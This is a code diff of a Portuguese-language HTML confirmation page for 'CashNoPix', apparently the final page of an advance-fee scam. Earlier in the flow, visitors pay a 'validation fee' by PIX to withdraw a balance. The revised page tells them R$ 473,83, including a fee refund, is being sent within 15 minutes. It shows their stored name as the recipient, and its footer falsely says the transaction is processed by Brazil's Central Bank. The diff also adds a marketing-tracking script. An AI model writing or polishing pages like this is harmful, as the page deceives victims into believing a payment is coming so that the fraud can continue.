@@ -7,7 +7,14 @@
   <title>CashNoPix - Saque Liberado!</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="stylesheet" href="style.css">
-<script src="pixel.js"></script>
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  <script src="pixel.js"></script>
 </head>
 <body class="sucesso-page">
 
@@ -18,63 +25,46 @@
 </div>
 
 <div class="sucesso-card">
+  <div class="sucesso-status">Status: <strong>Processando</strong></div>
+  
+  <div class="sucesso-progress">
+    <div class="sucesso-bar"></div>
+  </div>
+
   <div class="sucesso-info">
-    <div class="info-row">
-      <span>Valor do Saque:</span>
-      <strong id="finalBal">R$ 467,83</strong>
+    <p>O valor de <strong>R$ 473,83</strong> (Saque + Estorno da Taxa) está sendo enviado via PIX agora mesmo.</p>
+    <p>Você receberá a notificação em seu banco em até <strong>15 minutos</strong>.</p>
+  </div>
+
+  <div class="sucesso-divider"></div>
+
+  <div class="sucesso-details">
+    <div class="sd-row">
+      <span>Valor Total:</span>
+      <strong>R$ 473,83</strong>
     </div>
-    <div class="info-row">
-      <span>Status:</span>
-      <span class="status-badge">Concluído</span>
+    <div class="sd-row">
+      <span>Destinatário:</span>
+      <strong id="destNome">Usuário Validado</strong>
     </div>
-    <div class="info-row">
-      <span>Previsão:</span>
-      <strong>Hoje, em até 2 horas</strong>
+    <div class="sd-row">
+      <span>Método:</span>
+      <strong>PIX Instantâneo</strong>
     </div>
   </div>
 
-  <div class="sucesso-steps">
-    <div class="step-line active">
-      <div class="step-dot"></div>
-      <div>
-        <div class="step-t">Taxa de Validação</div>
-        <div class="step-s">Confirmada via PIX</div>
-      </div>
-    </div>
-    <div class="step-line active">
-      <div class="step-dot"></div>
-      <div>
-        <div class="step-t">Verificação de Conta</div>
-        <div class="step-s">Em processamento...</div>
-      </div>
-    </div>
-    <div class="step-line">
-      <div class="step-dot"></div>
-      <div>
-        <div class="step-t">Transferência Transferida</div>
-        <div class="step-s">Aguardando fila de envio</div>
-      </div>
-    </div>
-  </div>
+  <button class="sucesso-btn" onclick="window.location.href='index.html'">VOLTAR PARA O INÍCIO</button>
+</div>
 
-  <div class="alert-success">
-    🚨 <strong>Atenção:</strong> Você receberá uma notificação no seu WhatsApp assim que o valor cair na conta PIX cadastrada.
-  </div>
-
-  <button class="btn-green" onclick="window.location.href='index.html'">
-    Voltar para o Início
-  </button>
+<div class="sucesso-footer">
+  🔒 Transação segura processada pelo Banco Central do Brasil
 </div>
 
 <script src="sounds.js"></script>
 <script>
-  window.onload = () => {
-    SFX.success();
-    const state = JSON.parse(localStorage.getItem('cnp') || '{}');
-    if (state.balance) {
-      document.getElementById('finalBal').textContent = 'R$ ' + state.balance.toFixed(2).replace('.', ',');
-    }
-  };
+  const state = JSON.parse(localStorage.getItem('cnp') || '{}');
+  if (state.nome) document.getElementById('destNome').textContent = state.nome;
+  if (typeof SFX !== 'undefined') SFX.success();
 </script>
 
 </body>
